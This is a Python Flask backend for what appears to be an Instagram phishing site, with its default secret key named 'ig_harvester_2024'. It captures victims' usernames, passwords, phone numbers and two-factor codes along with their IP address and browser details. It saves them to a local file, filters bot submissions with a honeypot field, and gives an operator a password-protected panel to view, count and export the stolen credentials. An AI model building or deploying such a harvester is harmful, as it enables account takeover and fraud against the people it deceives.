# language: Python 3, file: app.py, target: Termux/Render/Vercel(local-only)
# Pure local file storage. No jsonbin, no supabase. Admin reads same file.
import os, json, time
from datetime import datetime, timezone
from flask import Flask, request, jsonify, render_template, redirect, url_for, session, Response

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "ig_harvester_2024")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "09")

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
CREDS_FILE = os.path.join(DATA_DIR, "creds.json")
os.makedirs(DATA_DIR, exist_ok=True)

def _read():
    if not os.path.exists(CREDS_FILE): return []
    try:
        with open(CREDS_FILE, "r", encoding="utf-8") as f: return json.load(f)
    except: return []

def _write(data):
    with open(CREDS_FILE, "w", encoding="utf-8") as f: json.dump(data, f, indent=2, ensure_ascii=False)

def _get_ip():
    if request.headers.get("X-Forwarded-For"): return request.headers["X-Forwarded-For"].split(",")[0].strip()
    if request.headers.get("X-Real-IP"): return request.headers["X-Real-IP"]
    return request.remote_addr or "unknown"

def _meta():
    return {"ip": _get_ip(), "ua": request.headers.get("User-Agent",""),
            "lang": request.headers.get("Accept-Language",""),
            "ts": datetime.now(timezone.utc).isoformat(), "ref": request.referrer or ""}

@app.route("/")
def index(): return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    d = request.json or {}
    if d.get("website"): return jsonify({"ok": True}), 200
    username = (d.get("username") or "").strip()
    password = d.get("password") or ""
    phone = d.get("phone") or ""
    if not username: return jsonify({"ok": False}), 400
    m = _meta()
    entry = {"stage": "credentials", "username": username, "password": password,
             "phone": phone, "ip": m["ip"], "ua": m["ua"], "lang": m["lang"],
             "ts": m["ts"], "ref": m["ref"]}
    creds = _read()
    creds.append(entry)
    _write(creds)
    return jsonify({"ok": True}), 200

@app.route("/verify", methods=["POST"])
def verify():
    d = request.json or {}
    if d.get("website"): return jsonify({"ok": True}), 200
    username = (d.get("username") or "").strip()
    code = d.get("code") or ""
    phone = d.get("phone") or ""
    if not code: return jsonify({"ok": False}), 400
    m = _meta()
    entry = {"stage": "2fa", "username": username, "code": code, "phone": phone,
             "ip": m["ip"], "ua": m["ua"], "lang": m["lang"], "ts": m["ts"], "ref": m["ref"]}
    creds = _read()
    creds.append(entry)
    _write(creds)
    return jsonify({"ok": True}), 200

@app.route("/api/creds")
def api_creds():
    if not session.get("admin"): return jsonify({"error": "unauthorized"}), 401
    creds = _read()
    creds.reverse()
    return jsonify({"creds": creds, "count": len(creds),
                    "two_fa": len([c for c in creds if c.get("stage")=="2fa"]),
                    "unique": len(set(c.get("username","") for c in creds if c.get("username")))})

@app.route("/admin", methods=["GET", "POST"])
def admin():
    if request.method == "POST":
        if request.form.get("password") == ADMIN_PASS:
            session["admin"] = True
            return redirect(url_for("admin"))
        return render_template("admin.html", error="Wrong password", authed=False), 401
    if not session.get("admin"): return render_template("admin.html", authed=False)
    creds = _read()
    creds.reverse()
    return render_template("admin.html", authed=True, creds=creds,
        cred_count=len(creds),
        two_fa_count=len([c for c in creds if c.get("stage")=="2fa"]),
        unique_users=len(set(c.get("username","") for c in creds if c.get("username"))))

@app.route("/admin/logout")
def admin_logout():
    session.pop("admin", None)
    return redirect(url_for("admin"))

@app.route("/admin/clear", methods=["POST"])
def admin_clear():
    if not session.get("admin"): return redirect(url_for("admin"))
    _write([])
    return redirect(url_for("admin"))

@app.route("/admin/export")
def admin_export():
    if not session.get("admin"): return redirect(url_for("admin"))
    creds = _read()
    return Response(json.dumps(creds, indent=2, ensure_ascii=False),
        mimetype="application/json",
        headers={"Content-Disposition": "attachment; filename=creds.json"})

@app.route("/health")
def health():
    return jsonify({"status": "ok", "backend": "local"}), 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)